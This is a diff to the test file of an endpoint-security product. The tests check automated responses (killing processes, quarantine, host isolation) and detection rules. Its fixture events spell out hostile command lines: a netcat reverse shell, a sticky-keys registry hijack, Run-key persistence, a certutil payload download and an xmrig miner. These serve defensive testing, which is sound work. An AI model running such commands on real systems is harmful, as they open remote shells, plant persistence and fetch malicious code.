@@ -591,9 +591,15 @@ test('events become a critical ransomware incident; the dashboard Defender lets 
   const checkin = await call('/api/endpoint-agent/v1/checkin', {
     method: 'POST',
     token: agentToken,
-    body: { policyVersion: 0, hashVersion: -1, stats: { cpuPercent: 0.4, memoryMb: 21 } },
+    // What a 32-bit float 0.3 looks like once it is sent as JSON.
+    body: { policyVersion: 0, hashVersion: -1, stats: { cpuPercent: 0.30000001192092896, memoryMb: 21 } },
   });
   assert.equal(checkin.status, 200);
+  assert.equal(
+    (await call('/api/guard/endpoints', { cookie: owner.cookie })).json.agents[0].stats.cpuPercent,
+    0.3,
+    'shown to one decimal place',
+  );
   assert.ok(checkin.json.policy, 'policy sent when the agent has an old version');
   assert.deepEqual(checkin.json.commands, []);
   const now = Date.now();
@@ -1159,4 +1165,157 @@ test('"This is expected" silences one exact file everywhere, can be undone, and 
   const done = (await call(`/api/guard/incidents/${lone.id}`, { cookie: quiet.cookie })).json.incident;
   assert.equal(done.status, 'closed');
   assert.match(done.closeNote, /marked as expected/);
+});
+
+test('autopilot on machines: acts only on the alert that is itself critical, once, and only what was ticked', async () => {
+  const overview = await call('/api/guard/overview', { cookie: quiet.cookie });
+  assert.deepEqual(
+    overview.json.autopilotActions.filter((a) => a.machine).map((a) => a.type),
+    ['kill-process', 'quarantine-file', 'isolate-host'],
+  );
+  const saved = await call('/api/guard/settings', {
+    method: 'POST',
+    cookie: quiet.cookie,
+    body: {
+      autopilot: { enabled: true, minSeverity: 'critical', actions: { 'kill-process': true, 'quarantine-file': true } },
+    },
+  });
+  assert.equal(saved.status, 200, JSON.stringify(saved.json));
+  assert.equal(saved.json.settings.autopilot.actions['kill-process'], true);
+  assert.equal(saved.json.settings.autopilot.actions['isolate-host'], false, 'not ticked, so never done');
+
+  const checkin = () =>
+    call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: quietToken, body: { version: '0.1.3' } });
+  await checkin();
+  const sent = await events(quietToken, [
+    // Critical: a remote shell, run from a drop folder (which is also a high "disguised program").
+    {
+      id: 'ap1',
+      type: 'process.start',
+      at: Date.now() - 3000,
+      process: {
+        pid: 900,
+        name: 'nc.exe',
+        path: 'C:\\Users\\Public\\nc.exe',
+        cmdline: 'nc.exe 203.0.113.5 4444 -e cmd.exe',
+      },
+    },
+    // Medium, same machine and so the same incident: an unverified program set to start itself.
+    {
+      id: 'ap2',
+      type: 'persistence.created',
+      at: Date.now() - 2000,
+      persistence: { kind: 'run-key', name: 'Tools', command: 'C:\\Users\\amy\\AppData\\Local\\Tools\\t.exe' },
+    },
+  ]);
+  assert.equal(sent.json.alerts, 3, JSON.stringify(sent.json));
+  const incident = (await incidentsOf(quiet.cookie)).find((i) => i.status !== 'closed');
+  assert.equal(incident.severity, 'critical');
+  const detail = () => call(`/api/guard/incidents/${incident.id}`, { cookie: quiet.cookie });
+  const offered = (await detail()).json.incident.actions.map((a) => a.type);
+  assert.ok(offered.includes('quarantine-file') && offered.includes('isolate-host'), offered.join(','));
+
+  let taken = (await detail()).json.actionsTaken;
+  assert.deepEqual(
+    taken.map((a) => [a.type, a.mode, a.status, a.params.pid]),
+    [['kill-process', 'autopilot', 'pending', 900]],
+    'the process behind the critical alert is stopped; the files of the lesser alerts are left for a person',
+  );
+  const commands = (await checkin()).json.commands;
+  assert.deepEqual(
+    commands.map((c) => [c.type, c.params.pid, c.params.processName]),
+    [['kill-process', 900, 'nc.exe']],
+  );
+  // The process had already exited. A machine action is tried once, not again on every new alert.
+  await call('/api/endpoint-agent/v1/results', {
+    method: 'POST',
+    token: quietToken,
+    body: { commandId: commands[0].id, ok: false, detail: 'process 900 is no longer running' },
+  });
+  await events(quietToken, [
+    {
+      id: 'ap3',
+      type: 'process.start',
+      at: Date.now() - 500,
+      process: {
+        pid: 900,
+        name: 'nc.exe',
+        path: 'C:\\Users\\Public\\nc.exe',
+        cmdline: 'nc.exe 203.0.113.9 4444 -e cmd.exe',
+      },
+    },
+  ]);
+  taken = (await detail()).json.actionsTaken;
+  assert.equal(taken.length, 1, JSON.stringify(taken.map((a) => [a.type, a.status])));
+  assert.equal(taken[0].status, 'failed');
+  assert.deepEqual((await checkin()).json.commands, []);
+  await call('/api/guard/settings', { method: 'POST', cookie: quiet.cookie, body: { autopilot: { enabled: false } } });
+});
+
+test('a response never targets the system tool an attacker used', () => {
+  const at = Date.now();
+  const alerts = (event) => detectEndpoint([{ id: `q${Math.random()}`, at, host, ...event }], { orgId: 'org1' }).alerts;
+  const sticky = alerts({
+    type: 'process.start',
+    process: {
+      pid: 5,
+      name: 'reg.exe',
+      path: 'C:\\Windows\\System32\\reg.exe',
+      cmdline:
+        'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /d cmd.exe /f',
+    },
+  })[0];
+  assert.equal(sticky.severity, 'critical');
+  assert.equal(sticky.context.path, null, 'reg.exe is not offered for quarantine');
+  const run = alerts({
+    type: 'process.start',
+    process: {
+      pid: 6,
+      name: 'reg.exe',
+      path: 'C:\\Windows\\System32\\reg.exe',
+      cmdline:
+        'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v U /d C:\\Users\\amy\\AppData\\Roaming\\upd.exe /f',
+    },
+  })[0];
+  assert.equal(run.context.path, 'c:\\users\\amy\\appdata\\roaming\\upd.exe', 'the program it installed is');
+  const lol = alerts({
+    type: 'process.start',
+    process: {
+      pid: 7,
+      name: 'certutil.exe',
+      path: 'C:\\Windows\\System32\\certutil.exe',
+      cmdline: 'certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe',
+    },
+  })[0];
+  assert.equal(lol.context.path, null);
+  const miner = alerts({
+    type: 'process.start',
+    host: { ...host, os: 'linux' },
+    process: {
+      pid: 8,
+      name: 'bash',
+      path: '/usr/bin/bash',
+      cmdline: 'bash -c "/tmp/.x/xmrig -o stratum+tcp://pool.example:4444"',
+    },
+  })[0];
+  assert.equal(miner.rule, 'cryptominer');
+  assert.equal(miner.context.path, null, 'bash is not the miner');
+  const sha = 'b'.repeat(64);
+  const proven = detectEndpoint(
+    [
+      {
+        id: 'q9',
+        at,
+        host,
+        type: 'process.start',
+        process: { pid: 9, name: 'tool.exe', path: 'C:\\Program Files\\Tool\\tool.exe', sha256: sha },
+      },
+    ],
+    { orgId: 'org1', hashes: new Map([[sha, { family: 'X' }]]) },
+  ).alerts[0];
+  assert.equal(
+    proven.context.path,
+    'C:\\Program Files\\Tool\\tool.exe',
+    'a file proven malicious by its hash is, wherever it is',
+  );
 });
